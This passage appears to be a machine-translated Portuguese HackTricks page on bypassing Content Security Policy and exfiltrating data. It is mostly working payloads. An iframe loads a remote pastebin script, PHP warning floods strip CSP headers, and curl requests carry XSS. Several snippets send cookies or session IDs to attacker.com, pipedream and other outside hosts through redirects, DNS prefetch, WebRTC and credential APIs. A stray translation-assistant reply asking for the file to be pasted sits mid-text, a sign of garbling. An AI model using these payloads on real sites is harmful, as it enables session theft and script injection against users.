For an example [**check this CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking de Informação com CSP e Iframe

- Um `iframe` é criado que aponta para uma URL (vamos chamá-la de `https://example.redirect.com`) que é permitida pelo CSP.
- Essa URL então redireciona para uma URL secreta (por exemplo, `https://usersecret.example2.com`) que **não é permitida** pelo CSP.
- Ao escutar o evento `securitypolicyviolation`, é possível capturar a propriedade `blockedURI`. Essa propriedade revela o domínio do URI bloqueado, leaking o domínio secreto para o qual a URL inicial redirecionou.

É interessante notar que navegadores como Chrome e Firefox apresentam comportamentos diferentes ao lidar com iframes em relação ao CSP, levando a potencial leakage de informação sensível devido a comportamento indefinido.

Outra técnica envolve explorar o próprio CSP para deduzir o subdomínio secreto. Este método baseia-se em um algoritmo de busca binária e em ajustar o CSP para incluir domínios específicos que são deliberadamente bloqueados. Por exemplo, se o subdomínio secreto é composto por caracteres desconhecidos, você pode testar iterativamente diferentes subdomínios modificando a diretiva CSP para bloquear ou permitir esses subdomínios. Aqui está um snippet mostrando como o CSP pode ser configurado para facilitar este método:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Ao monitorar quais requests são bloqueadas ou permitidas pelo CSP, é possível reduzir os caracteres possíveis no subdomínio secreto, eventualmente descobrindo a URL completa.

Ambos os métodos exploram as nuances da implementação do CSP e do comportamento nos navegadores, demonstrando como políticas aparentemente seguras podem inadvertidamente leak informações sensíveis.

Trick from [**here**](https://ctftime.org/writeup/29310).

## Tecnologias inseguras para contornar o CSP

### Erros do PHP quando há muitos parâmetros

According to the [**last technique commented in this video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), enviar muitos parâmetros (1001 GET parameters embora você também possa fazer isso com parâmetros POST e mais de 20 arquivos). Qualquer **`header()`** definido no código web PHP **não será enviado** por causa do erro que isso irá disparar.

### PHP response buffer overload

O PHP é conhecido por **armazenar a resposta em buffer até 4096** bytes por padrão. Portanto, se o PHP estiver exibindo um aviso, fornecendo **dados suficientes dentro dos avisos**, a **resposta** será **enviada** **antes** do **CSP header**, causando que o header seja ignorado.\
Então, a técnica consiste basicamente em **encher o buffer de resposta com avisos** para que o **CSP header** não seja enviado.

### Kill CSP via max_input_vars (headers already sent)

Porque os headers devem ser enviados antes de qualquer output, avisos emitidos pelo PHP podem invalidar chamadas posteriores a `header()`. Se a entrada do usuário exceder `max_input_vars`, o PHP lança primeiro um startup warning; qualquer `header('Content-Security-Policy: ...')` subsequente falhará com “headers already sent”, desabilitando efetivamente o CSP e permitindo reflective XSS que seriam bloqueados de outra forma.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
Por favor, cole aqui o conteúdo do arquivo src/pentesting-web/content-security-policy-csp-bypass/README.md que você quer traduzir. Vou traduzir para português mantendo exatamente a mesma sintaxe Markdown/HTML e seguindo as regras que você especificou.
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Reescrever a página de erro

Pelo [**this writeup**](https://blog.ssrf.kr/69) parece que era possível contornar uma proteção CSP carregando uma página de erro (potencialmente sem CSP) e reescrevendo seu conteúdo.
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME é uma técnica que abusa de um XSS (ou XSS altamente limitado) **em um endpoint de uma página** para **abusar** **outros endpoints da mesma origem.** Isso é feito carregando o endpoint vulnerável a partir de uma página do atacante e então atualizando a página do atacante para o endpoint real na mesma origem que se quer abusar. Desta forma o **endpoint vulnerável** pode usar o objeto **`opener`** no **payload** para **acessar o DOM** do **endpoint real a ser abusado**. Para mais informações ver:

{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

Além disso, **wordpress** possui um endpoint **JSONP** em `/wp-json/wp/v2/users/1?_jsonp=data` que **reflete** os **dados** enviados na saída (com a limitação de apenas letras, números e pontos).

Um atacante pode abusar desse endpoint para **gerar um ataque SOME** contra WordPress e **inseri-lo** dentro de `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` observe que este **script** será **carregado** porque é **allowed by 'self'**. Além disso, e porque WordPress está instalado, um atacante pode abusar do **SOME attack** através do **vulnerable** **callback** endpoint que **bypasses the CSP** para conceder mais privilégios a um usuário, instalar um novo plugin...\
For more information about how to perform this attack check [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

Se houver uma CSP estrita que não permite que você **interagir com servidores externos**, há algumas coisas que você sempre pode fazer para exfiltrar a informação.

### Location

You could just update the location to send to the attacker's server the secret information:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Meta tag

Você pode redirecionar injetando uma meta tag (isso é apenas um redirecionamento, isso não vai leak conteúdo)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

Para carregar páginas mais rápido, os navegadores vão pré-resolver nomes de host em endereços IP e armazená-los em cache para uso posterior.\
Você pode instruir um navegador a pré-resolver um nome de host com: `<link rel="dns-prefetch" href="something.com">`

Você poderia abusar desse comportamento para **exfiltrate sensitive information via DNS requests**:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
Outra maneira:
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
Para evitar que isso aconteça, o servidor pode enviar o cabeçalho HTTP:
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> Aparentemente, esta técnica não funciona em headless browsers (bots)

### WebRTC

Em várias páginas você pode ler que **WebRTC não verifica a política `connect-src` do CSP**.

Na verdade você pode _leak_ informações usando um _DNS request_. Confira este código:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
Outra opção:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

O popup de credenciais envia uma requisição DNS para o iconURL sem ser restringido pela página. Só funciona em um contexto seguro (HTTPS) ou em localhost.
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## Verificando políticas CSP online

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Criando CSP automaticamente

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Referências

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
